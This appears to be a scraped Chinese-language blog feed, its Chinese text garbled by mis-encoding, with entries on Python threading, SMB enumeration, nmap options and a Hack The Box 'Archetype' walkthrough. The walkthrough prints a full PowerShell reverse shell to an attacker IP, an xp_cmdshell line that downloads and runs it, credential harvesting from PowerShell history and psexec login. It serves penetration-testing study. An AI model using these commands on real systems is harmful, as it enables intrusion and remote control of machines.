class="line"></br></span><span class="line"><span class="hljs-comment"># å‡å®šè¿™æ˜¯ä½ çš„é“¶è¡Œå­˜æ¬¾:</span></span><span class="line">balance = <span class="hljs-number">0</span></span><span class="line marked">lock = threading.Lock()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_it</span>(<span class="hljs-params">n</span>):</span></span><span class="line">    <span class="hljs-comment"># å…ˆå­˜åå–ï¼Œç»“æœåº”è¯¥ä¸º0:</span></span><span class="line">    <span class="hljs-keyword">global</span> balance</span><span class="line">    balance = balance + n</span><span class="line">    balance = balance - n</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_thread</span>(<span class="hljs-params">n</span>):</span></span><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000000</span>):</span><span class="line marked">        lock.acquire()</span><span class="line marked">        <span class="hljs-keyword">try</span>:</span><span class="line marked">            change_it(n)</span><span class="line marked">        <span class="hljs-keyword">finally</span>:</span><span class="line marked">            lock.release()</span><span class="line"></br></span><span class="line"></br></span><span class="line">t1 = threading.Thread(target=run_thread, args=(<span class="hljs-number">5</span>,))</span><span class="line">t2 = threading.Thread(target=run_thread, args=(<span class="hljs-number">8</span>,))</span><span class="line">t1.start()</span><span class="line">t2.start()</span><span class="line">t1.join()</span><span class="line">t2.join()</span><span class="line"><span class="hljs-built_in">print</span>(balance)</span></code></pre></div></div><h3 id="Local-ä¼ é€’å˜é‡"><a href="#Local-ä¼ é€’å˜é‡" class="headerlink" title="Local ä¼ é€’å˜é‡"></a>Local ä¼ é€’å˜é‡</h3><p>ä½¿ç”¨localå…¶å®æ˜¯çœç•¥äº†<code>dict[threading.current_thread()]</code>ï¼Œæ¥ä¿è¯å–åˆ°çš„å˜é‡æ˜¯æœ¬çº¿ç¨‹çš„å˜é‡</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> threading</span><span class="line"></br></span><span class="line">local_s = threading.local()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start_thread</span>(<span class="hljs-params">name</span>):</span></span><span class="line">    local_s.name = name</span><span class="line">    proc_name()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">proc_name</span>():</span></span><span class="line">    name = local_s.name</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s, thread: %s&quot;</span> % (name, threading.current_thread().name))</span><span class="line"></br></span><span class="line"></br></span><span class="line">p1 = threading.Thread(target=start_thread, args=(<span class="hljs-string">&quot;p1&quot;</span>,), name=<span class="hljs-string">&quot;Thread_1&quot;</span>)</span><span class="line">p2 = threading.Thread(target=start_thread, args=(<span class="hljs-string">&quot;p2&quot;</span>,), name=<span class="hljs-string">&quot;Thread_2&quot;</span>)</span><span class="line">p1.start()</span><span class="line">p2.start()</span><span class="line">p1.join()</span><span class="line">p2.join()</span></code></pre></div></div><h3 id="çº¿ç¨‹æ± "><a href="#çº¿ç¨‹æ± " class="headerlink" title="çº¿ç¨‹æ± "></a>çº¿ç¨‹æ± </h3><p>ä½¿ç”¨<code>multiprocessing.pool.ThreadPool</code>åˆ›å»ºçº¿ç¨‹æ± </p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> multiprocessing.pool <span class="hljs-keyword">import</span> ThreadPool</span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span>(<span class="hljs-params">bar, baz</span>):</span></span><span class="line">  <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;hello &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(bar)</span><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;foo&#x27;</span> + baz</span><span class="line"></br></span><span class="line">pool = ThreadPool(processes=<span class="hljs-number">1</span>)</span><span class="line"></br></span><span class="line">async_result = pool.apply_async(foo, (<span class="hljs-string">&#x27;elin&#x27;</span>, <span class="hljs-string">&#x27;foo&#x27;</span>,))</span><span class="line"></br></span><span class="line">result = async_result.get() <span class="hljs-comment"># å–è¿”å›å€¼</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>smb</title>
      <link href="/2021/07/27/smb/"/>
      <url>/2021/07/27/smb/</url>
      
        <content type="html"><![CDATA[<p>SMB(Server Message Block) æ˜¯è¢«è®¾è®¡é€šè¿‡LANæ¥è¿œç¨‹è¯»å†™æ–‡ä»¶çš„åè®®ã€‚æ˜¯å¾®è½¯çš„ä¸»è¦é€šè®¯åè®®ã€‚</p><p>SMBä½¿ç”¨äº†NetBIOSæ¥å£ï¼Œæ‰€ä»¥ä¸ºä»€ä¹ˆsmbé€šå¸¸æ˜¯139ï¼Œ445ä¸¤ä¸ªç«¯å£?</p><h2 id="Port-139"><a href="#Port-139" class="headerlink" title="Port 139"></a>Port 139</h2><p>ç«¯å£139æ˜¯ NBT over IPã€‚</p><p>NetBIOS(Network Basic Input Output System) å¯ä»¥ä½¿è½¯ä»¶ã€PCç­‰è®¾å¤‡é€šè¿‡LANç½‘ç»œè¿›è¡Œé€šè®¯ã€‚</p><p>åœ¨NetBIOSç½‘ç»œä¸Šè¿è¡Œçš„è½¯ä»¶é€šè¿‡NetBIOSåç§°è¿›è¡Œäº’ç›¸è¯†åˆ«ã€‚NetBIOSåç§°é•¿åº¦ä¸º16ä¸ªå­—ç¬¦ï¼Œä¸è®¡ç®—æœºåç§°åˆ†å¼€ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-arduino codeBlockLines"><span class="line"><span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span></code></pre></div></div><h2 id="Port-445"><a href="#Port-445" class="headerlink" title="Port 445"></a>Port 445</h2><p>445ç«¯å£æ˜¯ SMB over IPï¼Œ ç°åœ¨ä¹Ÿç§°ä¸ºCIFS(Common Internet File System)ã€‚è¿è¡Œåœ¨åº”ç”¨å±‚ï¼Œç”¨äºæä¾›è®¿é—®æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£ä»¥åŠå…¶ä»–åŸºäºç½‘ç»œçš„ä¸¤ç«¯èŠ‚ç‚¹é€šè®¯ã€‚</p><p>åœ¨Windowsä¸­ï¼ŒSMBç›´æ¥åŸºäºTCP/IPè¿è¡Œï¼Œä¸éœ€è¦NetBIOS,æ‰€ä»¥ä¸€èˆ¬åªæœ‰445ã€‚<br>è€Œå…¶ä»–æ“ä½œç³»ç»Ÿå°±ä¼šæœ‰139ç«¯å£ä¸€èµ·ï¼Œè¿™è¯´æ˜SMBçš„è¿è¡Œæ˜¯åŸºäºBetBIOSçš„TCP/IPçš„ã€‚</p><h3 id="IPC"><a href="#IPC" class="headerlink" title="$IPC"></a>$IPC</h3><p>å½“ä½¿ç”¨åŒ¿åç”¨æˆ·æˆ–è€…ç©ºç”¨æˆ·çš„æ—¶å€™ï¼Œå¯ä»¥è®¿é—®<code>IPC$</code>ã€‚ä½¿ç”¨<a href="#">Post not found: enum4linux-å·¥å…·ä½¿ç”¨</a>ä»è¿™é‡Œå¯ä»¥è·å–ï¼š</p><ol><li>æ“ä½œç³»ç»Ÿä¿¡æ¯</li><li>åŸŸçš„è¯¦ç»†ä¿¡æ¯</li><li>æœ¬åœ°ç”¨æˆ·å’Œç»„çš„åˆ—è¡¨</li><li>å¯ç”¨SMBå…±äº«çš„è¯¦ç»†ä¿¡æ¯</li><li>ç”Ÿæ•ˆçš„ç³»ç»Ÿå®‰å…¨ç­–ç•¥</li></ol><h2 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a>æšä¸¾</h2><h3 id="å¯¹ç½‘æ®µä¸­çš„ä¸»æœºæœç´¢SMBæœåŠ¡"><a href="#å¯¹ç½‘æ®µä¸­çš„ä¸»æœºæœç´¢SMBæœåŠ¡" class="headerlink" title="å¯¹ç½‘æ®µä¸­çš„ä¸»æœºæœç´¢SMBæœåŠ¡"></a>å¯¹ç½‘æ®µä¸­çš„ä¸»æœºæœç´¢SMBæœåŠ¡</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nbtscan -r 192.168.0.1/24</span></code></pre></div></div><h3 id="ç‰ˆæœ¬ä¿¡æ¯"><a href="#ç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="ç‰ˆæœ¬ä¿¡æ¯"></a>ç‰ˆæœ¬ä¿¡æ¯</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">msf&gt; use  auxiliary/scanner/smb/smb_version  </span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/sh</span></span><span class="line"><span class="hljs-comment">#Author: rewardone</span></span><span class="line"><span class="hljs-comment">#Description:</span></span><span class="line"><span class="hljs-comment"># Requires root or enough permissions to use tcpdump</span></span><span class="line"><span class="hljs-comment"># Will listen for the first 7 packets of a null login</span></span><span class="line"><span class="hljs-comment"># and grab the SMB Version</span></span><span class="line"><span class="hljs-comment">#Notes:</span></span><span class="line"><span class="hljs-comment"># Will sometimes not capture or will print multiple</span></span><span class="line"><span class="hljs-comment"># lines. May need to run a second time for success.</span></span><span class="line"><span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: ./smbver.sh RHOST &#123;RPORT&#125;&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span>; <span class="hljs-keyword">else</span> rhost=<span class="hljs-variable">$1</span>; <span class="hljs-keyword">fi</span></span><span class="line"><span class="hljs-keyword">if</span> [ ! -z <span class="hljs-variable">$2</span> ]; <span class="hljs-keyword">then</span> rport=<span class="hljs-variable">$2</span>; <span class="hljs-keyword">else</span> rport=139; <span class="hljs-keyword">fi</span></span><span class="line">tcpdump -s0 -n -i tap0 src <span class="hljs-variable">$rhost</span> and port <span class="hljs-variable">$rport</span> -A -c 7 2&gt;/dev/null | grep -i <span class="hljs-string">&quot;samba\|s.a.m&quot;</span> | tr -d <span class="hljs-string">&#x27;.&#x27;</span> | grep -oP <span class="hljs-string">&#x27;UnixSamba.*[0-9a-z]&#x27;</span> | tr -d <span class="hljs-string">&#x27;\n&#x27;</span> &amp; <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;<span class="hljs-variable">$rhost</span>: &quot;</span> &amp;</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;exit&quot;</span> | smbclient -L <span class="hljs-variable">$rhost</span> 1&gt;/dev/null 2&gt;/dev/null</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &amp;&amp; sleep .1</span></code></pre></div></div><h3 id="æœç´¢å¯¹åº”ç‰ˆæœ¬çš„exploit"><a href="#æœç´¢å¯¹åº”ç‰ˆæœ¬çš„exploit" class="headerlink" title="æœç´¢å¯¹åº”ç‰ˆæœ¬çš„exploit"></a>æœç´¢å¯¹åº”ç‰ˆæœ¬çš„exploit</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">msf&gt; search <span class="hljs-built_in">type</span>:exploit platform:windows target:2008 smb</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">searchsploit microsoft smb</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>smb æ¸—é€æ¸…å•</title>
      <link href="/2021/07/27/smb-%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/"/>
      <url>/2021/07/27/smb-%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p><a href="/2021/07/27/smb/" title="smb">smb</a></p><p>å‘½ä»¤å·²é›†æˆåˆ°<a href="https://github.com/Elinpf/cmder">cmder</a></p><p>smbçš„ä¿¡æ¯æ”¶é›†</p><ul><li><input disabled="" type="checkbox"> æœç´¢ç½‘ç»œä¸­çš„SMBæœåŠ¡</li><li><input disabled="" type="checkbox"> ç‰ˆæœ¬ä¿¡æ¯</li><li><input disabled="" type="checkbox"> é’ˆå¯¹ç‰ˆæœ¬çš„exploitä¿¡æ¯</li></ul><p>æ²¡æœ‰ç”¨æˆ·åå’Œå¯†ç çš„æƒ…å†µä¸‹</p><ul><li><input disabled="" type="checkbox"> ä½¿ç”¨ç©ºè´¦å·å’Œå¯†ç </li><li><input disabled="" type="checkbox"> ä½¿ç”¨åŒ¿åè´¦å·</li><li><input disabled="" type="checkbox"> æ£€æŸ¥æ˜¯å¦æœ‰å¯ç”¨å…±äº«ç›®å½•</li><li><input disabled="" type="checkbox"> ä½¿ç”¨å¸¸ç”¨å¯†ç å¿«é€Ÿè¿›è¡Œæš´åŠ›ç ´è§£</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> checklist </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB start point 1 - Archetype</title>
      <link href="/2021/07/27/HTB-start-point-1-archetype/"/>
      <url>/2021/07/27/HTB-start-point-1-archetype/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea">å‚è€ƒ</a>è§£è¯»å®˜æ–¹æ–‡æ¡£</li><li><a href="http://imin.red/2020-04-15-0x01-startingpoint-archetype/">è¿™ç¯‡æ–‡ç« </a>è¯¦ç»†è®²è¿°äº†æ€è€ƒè¿‡ç¨‹</li><li><a href="https://www.hackingarticles.in/smb-penetration-testing-port-445/">è¿™ç¯‡æ–‡ç« </a>ä»‹ç»äº†å…³äºsmbçš„æ¸—é€æŠ€å·§ï¼ŒåŒ…æ‹¬ä½¿ç”¨msf</li><li><a href="https://www.hackingarticles.in/mssql-penetration-testing-metasploit/">MSSQL Penetration Testing with Metasploit</a></li><li><a href="https://www.hackingarticles.in/smb-penetration-testing-port-445/">SMB Penetration Testing (Port 445)</a></li></ul><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>ä¾¦å¯Ÿé˜¶æ®µï¼Œæ ¹æ®<a href="/2021/07/26/Linux-%E4%BE%A6%E5%AF%9F%E6%B8%85%E5%8D%95/" title="Linux ä¾¦å¯Ÿæ¸…å•">Linux ä¾¦å¯Ÿæ¸…å•</a>ï¼Œæ”¶é›†å¼€å¯çš„ç«¯å£</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d <span class="hljs-string">&#x27;/&#x27;</span> -f 1 | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span> | sed s/,$//)</span><span class="line"></br></span><span class="line">nmap -sC -sV -p<span class="hljs-variable">$ports</span> 10.10.10.27 </span></code></pre></div></div><p>é€šè¿‡æ‰«æå¯ä»¥å‘ç°<code>445</code>ç«¯å£æ˜¯å¼€å¯çš„ï¼ŒæœåŠ¡æ˜¯SQL Serverã€‚</p><p>æ ¹æ®<a href="/2021/07/27/smb-%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/" title="smb æ¸—é€æ¸…å•">smb æ¸—é€æ¸…å•</a></p><p>å¯èƒ½çš„æ¼æ´ä¸ºåŒ¿åç”¨æˆ·ç™»å½•</p><p>ä½¿ç”¨ <code>smbclient -L 10.10.10.27</code>å‘ç°</p><p><img src="/2021/07/27/HTB-start-point-1-archetype/1611823952726.png"></p><p>å…¶ä¸­æœ‰backupså¯èƒ½æ˜¯çªç ´ç‚¹ï¼Œä½¿ç”¨ <code>smbclient //10.10.10.27/backups</code>è¿›å…¥smbå…±äº«æ–‡ä»¶ï¼Œç„¶åå‘ç°åœ¨ç›®å½•ä¸‹æœ‰<code>.dtsConfig</code>çš„æ–‡ä»¶ã€‚</p><blockquote><p>A DTSCONFIG file is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of metadata such as the server name, database names, and other connection properties to configure SSIS packages.</p></blockquote><p>ä¹Ÿå°±æ˜¯SQLServerçš„é…ç½®æ–‡ä»¶ã€‚</p><p>ä½¿ç”¨<code>get &lt;filename&gt;</code>å‘½ä»¤å°†æ–‡ä»¶æ‹·è´åˆ°æœ¬åœ°åæ‰“å¼€å‘ç°ï¼Œ<br><img src="/2021/07/27/HTB-start-point-1-archetype/1611824416119.png"></p><p>è¿™ä¸ªä¹Ÿå°±æ˜¯æ•°æ®åº“çš„ç”¨æˆ·ã€‚ä½†æ˜¯è¦è€ƒè™‘çš„æ˜¯ï¼Œè¿™ä¸ªç”¨æˆ·å¯èƒ½æ˜¯æ²¡æœ‰é«˜çº§æƒé™çš„ã€‚</p><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>è¦ç™»å½•æ•°æ®åº“ï¼Œä½¿ç”¨çš„æ˜¯<a href="https://github.com/SecureAuthCorp/impacket/tree/master/impacket">impackets</a>å·¥å…·ç®±ä¸­çš„<code>mssqlclient.py</code> å·¥å…·ã€‚</p><p><code>mssqlclint.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p><ul><li>æ³¨æ„æ˜¯<code>/</code></li><li>windowsçš„éªŒè¯ <code>-windows-auth</code></li></ul><p>å½“è¿›å…¥mssqlä¹‹åï¼Œè¦ç¡®å®šæƒé™ã€‚</p><ul><li><code>select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></li></ul><p>ç¡®å®šæƒé™åæ‰“å¼€<code>xp_cmdshell</code>è¿è¡Œæƒé™ã€‚ åœ¨mssqlclient.pyä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨<code>enable_xp_cmdshell</code>ä¸€é”®å¼€å¯</p><p>ç„¶åé€šè¿‡æ–¹å‘è¿æ¥è·å¾—shellã€‚</p><p>æ‰‹å†Œç»™å‡ºçš„æ‰‹åŠ¨è§£æ³•æ˜¯å†™ä¸€ä¸ªgetshellçš„æ–‡ä»¶ï¼Œç„¶åè®©ç›®æ ‡æœºä¸‹è½½å¹¶æ‰§è¡Œã€‚</p><p>æ‰€ä»¥è¿™é‡Œå°±æœ‰4ä¸ªç‚¹ï¼š</p><ol><li>è¦è®©ç›®æ ‡æœºä¸‹è½½æ”»å‡»æœºä¸­çš„æ–‡ä»¶ï¼Œéœ€è¦åœ¨æ”»å‡»æœºä¸Šå¼€å¯ä¸‹è½½ç«¯å£ï¼Œè¿™é‡Œç»™å‡ºçš„æ–¹æ³•æ˜¯ä½¿ç”¨httpçš„æ–¹å¼ä¸‹è½½ã€‚<ul><li><code>python -m http.server 1633</code></li></ul></li><li>ç›®æ ‡æœºä¸‹è½½æ‰§è¡Œåéœ€è¦ä¸æ”»å‡»æœºå»ºç«‹shellè¿æ¥ï¼Œæ‰€ä»¥éœ€è¦å¦å¤–ä¸€ä¸ªç›‘å¬ç«¯å£ã€‚<ul><li><code>nc -nvlp 5711</code></li></ul></li><li>æ”»å‡»æœºä¸Š<code>shell.ps1</code>è¿™ä¸ªæ–‡ä»¶æ€ä¹ˆå†™</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php codeBlockLines"><span class="line"><span class="hljs-variable">$client</span> = <span class="hljs-keyword">New</span>-<span class="hljs-keyword">Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.14.32&quot;</span>,<span class="hljs-number">5711</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>.<span class="hljs-number">.65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) -ne <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-keyword">New</span>-<span class="hljs-keyword">Object</span> -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | Out-<span class="hljs-keyword">String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;# &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close() </span></code></pre></div></div><ol start="4"><li>ç›®æ ‡æœºä¸Šå¦‚ä½•ä¸‹è½½å¹¶è¿è¡Œ<code>shell.ps1</code>æ–‡ä»¶</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">xp_cmdshell &quot;powershell &quot;IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(\&quot;http://10.10.14.32:1633/shell.ps1\&quot;);&quot;&quot;</span></code></pre></div></div><p>è¿™æ ·å°±å¯ä»¥è·å¾—shelläº†ã€‚ é‚£ä¹ˆè¿˜æœ‰æ²¡æœ‰å…¶ä»–çš„æ–¹æ³•å‘¢ï¼Ÿ åé¢è®¨è®º</p><h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><p>åœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼Œæƒé™æå‡æ˜¯é€šè¿‡æ‰¾åˆ°ç›®æ ‡æœºä¸Šçš„å†å²è®°å½•å¾—åˆ°Administratorç”¨æˆ·çš„ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-powershell codeBlockLines"><span class="line"><span class="hljs-built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span></code></pre></div></div><p><img src="/2021/07/27/HTB-start-point-1-archetype/1611890465860.png"></p><p><code>net use</code> æ˜¯å°†è¿œç«¯smbæ˜ å°„åˆ°æœ¬åœ°ä¸Šï¼Œå¹¶ä¸”é€šå¸¸ä¼šä½¿ç”¨ç”¨æˆ·ã€‚</p><p>å¾—åˆ°ç”¨æˆ·å¯†ç ä¹‹åå°±æ˜¯ç™»å½•çš„æ“ä½œäº†ã€‚</p><p>ä½¿ç”¨çš„å·¥å…·æ˜¯<code>psexec</code></p><p><code>psexec administrator@10.10.10.27</code></p><p>flag å°±åœ¨æ¡Œé¢ç›®å½•ä¸Š</p><h2 id="åç»­"><a href="#åç»­" class="headerlink" title="åç»­"></a>åç»­</h2><p>get shell çš„å·¥å…·ï¼š</p><ol><li>MSF <code>exploit/windows/smb/psexec</code><ul><li>ä½¿ç”¨<a href="https://github.com/trustedsec/unicorn">unicorn</a>å¯ä»¥ç”Ÿæˆç”Ÿæˆå¯¹åº”çš„shellcode</li></ul></li><li>psexec</li><li>Winexe</li><li>smbexec.py</li><li>wmiexec.py</li><li>CrackMapExec</li><li></li></ol><ul><li><a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">å‚è€ƒæ–‡ç« </a></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linpeas ä½¿ç”¨</title>
      <link href="/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>linpeasæ˜¯ç”¨shellè„šæœ¬ç¼–å†™çš„æœ¬åœ°ææƒæ£€æŸ¥æ¸…å•ï¼Œ<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">github</a></p><p>ä½¿ç”¨å‘½ä»¤å·²æ”¶å½•è‡³<a href="https://github.com/Elinpf/cmder">cmder</a></p><p><img src="/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ææƒ </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap ä½¿ç”¨</title>
      <link href="/2021/07/26/nmap-%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/07/26/nmap-%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="å¸¸ç”¨é€‰é¡¹"><a href="#å¸¸ç”¨é€‰é¡¹" class="headerlink" title="å¸¸ç”¨é€‰é¡¹"></a>å¸¸ç”¨é€‰é¡¹</h2><ol><li><code>-sn</code> åªåˆ¤æ–­ä¸»æœºæ˜¯å¦åœ¨çº¿ï¼Œä¸æ‰«æç«¯å£</li><li><code>-sV</code> åˆ¤æ–­æœåŠ¡è½¯ä»¶ç‰ˆæœ¬</li><li><code>-O</code> åˆ¤æ–­æ“ä½œç³»ç»Ÿ</li><li><code>-Pn</code> å½“ä¸»æœºç¦pingåä½¿ç”¨ï¼Œå¦åˆ™ä¼šè¢«è·³è¿‡</li><li><code>-A</code> å¼ºåŠ›æ£€æµ‹ï¼ŒåŒ…å«ä»¥ä¸‹ï¼š</li></ol><p>æœåŠ¡ç‰ˆæœ¬è¯†åˆ«ï¼ˆ-sVï¼‰<br>æ“ä½œç³»ç»Ÿè¯†åˆ«ï¼ˆ-Oï¼‰<br>è„šæœ¬æ‰«æï¼ˆ-sCï¼‰<br>Tracerouteï¼ˆâ€“tracerouteï¼‰</p><h2 id="TCPæ‰«æé€‰é¡¹"><a href="#TCPæ‰«æé€‰é¡¹" class="headerlink" title="TCPæ‰«æé€‰é¡¹"></a>TCPæ‰«æé€‰é¡¹</h2><ol><li><p>TCPè¿æ¥æ‰«æï¼ˆ-sTï¼‰ï¼šæŒ‡å®šè¿™ä¸ªé€‰é¡¹åï¼Œç¨‹åºå°†å’Œç›®æ ‡ä¸»æœºçš„æ¯ä¸ªç«¯å£éƒ½è¿›è¡Œ<strong>å®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹</strong>ã€‚å¦‚æœæˆåŠŸå»ºç«‹è¿æ¥ï¼Œåˆ™åˆ¤å®šè¯¥ç«¯å£æ˜¯å¼€æ”¾ç«¯å£ã€‚ç”±äºåœ¨æ£€æµ‹æ¯ä¸ªç«¯å£æ—¶éƒ½éœ€è¦è¿›è¡Œä¸‰ æ¬¡æ¡æ‰‹ï¼Œæ‰€ä»¥è¿™ç§æ‰«ææ–¹å¼æ¯”è¾ƒæ…¢ï¼Œè€Œä¸”æ‰«æè¡Œä¸ºå¾ˆå¯èƒ½è¢«ç›®æ ‡ä¸»æœºè®°å½•ä¸‹æ¥ã€‚å¦‚æœå¯åŠ¨ Nmapçš„ç”¨æˆ·çš„æƒé™ä¸è¶³ï¼Œé‚£ä¹ˆé»˜è®¤æƒ…å†µä¸‹Nmapç¨‹åºå°†ä»¥è¿™ç§æ¨¡å¼è¿›è¡Œæ‰«æã€‚</p></li><li><p>â€‹SYNæ‰«æï¼ˆ-sSï¼‰ï¼šè¯¥é€‰é¡¹ä¹Ÿç§°ä¸ºåŠå¼€è¿æ¥æˆ–è€…SYN stealthã€‚é‡‡ç”¨è¯¥é€‰é¡¹åï¼ŒNmapå°†<strong>ä½¿ç”¨å«æœ‰SYNæ ‡å¿—ä½</strong>çš„æ•°æ®åŒ…è¿›è¡Œç«¯å£æ¢æµ‹ã€‚å¦‚æœç›®æ ‡ä¸»æœºå›å¤äº†SYN/ACKåŒ…ï¼Œåˆ™è¯´æ˜è¯¥ç«¯å£å¤„ äºå¼€æ”¾çŠ¶æ€ï¼šå¦‚æœå›å¤çš„æ˜¯RST/ACKåŒ…ï¼Œåˆ™è¯´æ˜è¿™ä¸ªç«¯å£å¤„äºå…³é—­çŠ¶æ€ï¼›å¦‚æœæ²¡æœ‰ä»»ä½•å“åº” æˆ–è€…å‘é€äº†ICMP 